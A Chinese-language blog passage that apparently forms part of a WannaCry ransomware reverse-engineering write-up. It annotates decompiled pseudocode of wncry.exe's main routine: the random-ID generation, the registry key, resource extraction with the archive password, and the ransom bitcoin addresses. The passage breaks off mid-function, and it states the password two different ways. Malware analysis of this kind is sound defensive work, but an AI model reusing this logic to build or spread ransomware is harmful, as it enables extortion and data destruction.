<h1 id="5-wncry-exe-病毒主程序分析"><a href="#5-wncry-exe-病毒主程序分析" class="headerlink" title="5 wncry.exe 病毒主程序分析"></a>5 wncry.exe 病毒主程序分析</h1><h2 id="5-1-主体逻辑"><a href="#5-1-主体逻辑" class="headerlink" title="5.1 主体逻辑"></a>5.1 主体逻辑</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  

Filename <span class="token operator">=</span> byte_40F910<span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 初始化内存  </span>

v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token number">0x208u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 获取当前进程的完整路径  </span>

<span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>RandResult<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 获取一串随机的字母+数字  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_p___argc</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span>           <span class="token comment">// 如果命令行参数个数不等于2  </span>

<span class="token operator">||</span> <span class="token punctuation">(</span>v5 <span class="token operator">=</span> <span class="token function">_p___argv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> aI<span class="token punctuation">)</span><span class="token punctuation">)</span>  

<span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_401B5F</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  

<span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">CopyFileA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span>FileName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  

<span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_401F5D</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>             <span class="token comment">// 查找在当前文件路径中的位置  </span>

<span class="token operator">*</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">SetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 切换当前的工作目录  </span>

<span class="token function">SetReg</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment">// 设置当前进程目录到注册表项 </span>

<span class="token function">ReleaseFiles</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">::</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 释放文件和语言包到工作路径下  </span>

<span class="token function">WriteCwnry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 重写c.wnry文件 添加比特币账户  </span>

<span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>CommandLine<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 隐藏当前路径下的所有文件 </span>

<span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>aIcaclsGrantEve<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 添加Everyone用户 授予all访问权限  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                            <span class="token comment">// 获取一些必要的API函数地址  </span>

<span class="token punctuation">&#123;</span>  

CDatabase<span class="token operator">::</span><span class="token function">CDatabase</span><span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 构造函数 初始化临界区  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ImportKeyAndAllocMem</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 导入私钥并且分配两块固定内存  </span>

<span class="token punctuation">&#123;</span>  

DecryptFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

pFile <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">DecryptFile</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> t_wnry<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DecryptFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 从t.wnry中解密出一个dll文件  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> pFile <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

pHeapBase <span class="token operator">=</span> <span class="token function">WriteAllocMem</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> DecryptFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 申请一块堆空间 并把解密出的dll写入到堆空间 pHeapBase=dll->Nt头  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> pHeapBase <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

TaskStartAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">GetExportFunAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pHeapBase<span class="token punctuation">,</span> TaskStart<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> TaskStartAddr <span class="token punctuation">)</span>  <span class="token comment">// 从堆空间中取出dll导出函数的地址 并调用 </span>

<span class="token function">TaskStartAddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

CDatabase<span class="token operator">::</span><span class="token operator">~</span><span class="token function">CDatabase</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CDatabase <span class="token operator">*</span><span class="token punctuation">)</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 析构函数 释放资源  </span>

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过对主题的完整注释我们大致了解了病毒所进行的主要操作，经总结为如下过程：</p>
<ol>
<li><p> 初始化 内存，工作目录和随机数</p>
</li>
<li><p> 设置注册表项为当前进程目录</p>
</li>
<li><p> 释放资源包内的文件和语言包</p>
</li>
<li><p> 在c.wnry 内添加比特币账户</p>
</li>
<li><p> 隐藏当前路径下的文件</p>
</li>
<li><p> 进行加解密操作</p>
</li>
<li><p> 释放资源</p>
</li>
</ol>
<p>以上过程能完整的展现出了病毒进行的操作，但是有一些操作由于参数设置错误，实际上没有实现。接下来我将对病毒的具体行为进行分析总共分为两个部分<br>第一部分 初始化操作 第二部分 加载病毒核心操作</p>
<h2 id="5-2-初始化操作"><a href="#5-2-初始化操作" class="headerlink" title="5.2 初始化操作"></a>5.2 初始化操作</h2><p>初始化作为病毒文件的第一部分主要涉及几个函数<br>GetRandom获取随机数，SetReg设置注册表，ReleaseFiles<br>释放资源文件，我们将进行逐一的分析</p>
<h3 id="5-2-1-GetRandom-获取随机数"><a href="#5-2-1-GetRandom-获取随机数" class="headerlink" title="5.2.1 GetRandom 获取随机数"></a>5.2.1 GetRandom 获取随机数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token keyword">int</span> RandResult<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  

<span class="token function">GetComputerNameW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nSize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 获取计算机名  </span>

i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcslen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">)</span> <span class="token punctuation">)</span>                  <span class="token comment">// 如果计算机名的长度不为0  </span>

<span class="token punctuation">&#123;</span>  

v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>ComputerName<span class="token punctuation">;</span>  

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

v1 <span class="token operator">*=</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span>              <span class="token comment">// V1=[ComputerName]  即V1=计算机名的第一个字母的ASCII  </span>

<span class="token operator">++</span>i<span class="token punctuation">;</span>                    <span class="token comment">// 下标自增  </span>

<span class="token operator">++</span>v2<span class="token punctuation">;</span>                   <span class="token comment">// ComputerName++两次 即截断计算机名的第一个字母  </span>

v3 <span class="token operator">=</span> <span class="token function">wcslen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> v3 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>       <span class="token comment">// 循环次数i=strlen(Computer)   </span>

<span class="token function">srand</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// v1=计算机名所有ASCII的乘积  </span>

v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v5 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">do</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4<span class="token operator">++</span> <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">0x61</span><span class="token punctuation">;</span>

<span class="token comment">// 随机取了一个字符串 假设：cecazrsga  </span>

<span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> v5 <span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

v6 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> v6 <span class="token punctuation">)</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4<span class="token operator">++</span> <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xA</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">;</span><span class="token comment">// 随机取了一个数字122  </span>

result <span class="token operator">=</span> RandResult<span class="token punctuation">;</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> result<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token comment">// 最后的结果等于两次随机结果拼在一起 cecazrsga122  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>病毒首先获取计算机名ASCII码的连乘，并以其作为种子利用rand()函数得到一对字母+数字的随机数作为随机字符串</p>
<h3 id="5-2-2-SetReg-设置注册表项"><a href="#5-2-2-SetReg-设置注册表项" class="headerlink" title="5.2.2 SetReg 设置注册表项"></a>5.2.2 SetReg 设置注册表项</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">SetReg</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    

<span class="token function">wcscat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token comment">// 字符串拼接->SoftwareWanaCrypt0r   </span>

v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span>  

<span class="token function">RegCreateKeyW</span><span class="token punctuation">(</span>HKEY_CURRENT_USER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">else</span>  

<span class="token function">RegCreateKeyW</span><span class="token punctuation">(</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建了注册表项  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hKey <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">GetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token number">0x207u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取当前的进程所在目录  </span>

v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 获取所在目录的长度  </span>

v2 <span class="token operator">=</span> <span class="token function">RegSetValueExA</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> ValueName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 将当前exe所在的路径设置为注册表项的值  </span>

<span class="token punctuation">&#125;</span>  

<span class="token keyword">else</span>  

<span class="token punctuation">&#123;</span>  

cbData <span class="token operator">=</span> <span class="token number">519</span><span class="token punctuation">;</span>  

v3 <span class="token operator">=</span> <span class="token function">RegQueryValueExA</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> ValueName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span>  

v2 <span class="token operator">=</span> v3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>  

<span class="token function">SetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">RegCloseKey</span><span class="token punctuation">(</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>  

<span class="token keyword">break</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v12 <span class="token operator">>=</span> <span class="token number">2</span> <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可见病毒创建了一个注册表项<br>并将当前病毒主体所在位置的决定路径设置到注册表的<br>HKEY_LOCAL_MACHINESOFTWARE 下</p>
<h3 id="5-2-3-ReleaseFiles-释放资源文件"><a href="#5-2-3-ReleaseFiles-释放资源文件" class="headerlink" title="5.2.3 ReleaseFiles 释放资源文件"></a>5.2.3 ReleaseFiles 释放资源文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">ReleaseFiles</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>Str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  

hRsrc <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x80A</span><span class="token punctuation">,</span> Type<span class="token punctuation">)</span><span class="token punctuation">;</span>

HRSRC <span class="token operator">=</span> hRsrc<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hRsrc <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

hGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal <span class="token punctuation">)</span>                               <span class="token comment">// 将资源载入到内存并锁定  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

lpRes <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lpRes <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

ResourceSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> HRSRC<span class="token punctuation">)</span><span class="token punctuation">;</span>

v7 <span class="token operator">=</span> <span class="token function">sub_4075AD</span><span class="token punctuation">(</span>lpRes<span class="token punctuation">,</span> ResourceSize<span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// str="WNcry@2017" 函数返回1||0  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x128u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">SetReleasePath</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将0x24放到内存中 v11=0x24  </span>

v9 <span class="token operator">=</span> v11<span class="token punctuation">;</span>  

v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">SetReleasePath</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置文件释放的路径 并保存到内存中  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>

<span class="token comment">// 比较b.wnry和c.wnry  </span>

<span class="token function">ReleaseFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Str1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 释放文件到工作目录下  </span>

<span class="token operator">++</span>v10<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v10 <span class="token operator">&lt;</span> v9 <span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">FreeMemory</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 做内存释放等扫尾工作  </span>

<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数的主要作用就是将资源包中的文件，利用解压密码”WNcry@1017”进行解压到当前进程的路径下，方便下面的操作进一步利用压缩包中的文件。</p>
<h3 id="5-2-4-WriteCwnry-重写c-wnry"><a href="#5-2-4-WriteCwnry-重写c-wnry" class="headerlink" title="5.2.4 WriteCwnry 重写c.wnry"></a>5.2.4 WriteCwnry 重写c.wnry</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">WriteCwnry</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>  

Source <span class="token operator">=</span> a13am4vw2dhxygx<span class="token punctuation">;</span>                  <span class="token comment">// 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94</span>

v5 <span class="token operator">=</span> a12t9ydpgwuez9n<span class="token punctuation">;</span>                      <span class="token comment">// 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw  </span>

v6 <span class="token operator">=</span> a115p7ummngoj1p<span class="token punctuation">;</span>                      <span class="token comment">// 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn  </span>

result <span class="token operator">=</span> <span class="token function">ReadOrWriteFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DstBuf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 读取c.wnry到内存中   </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>  

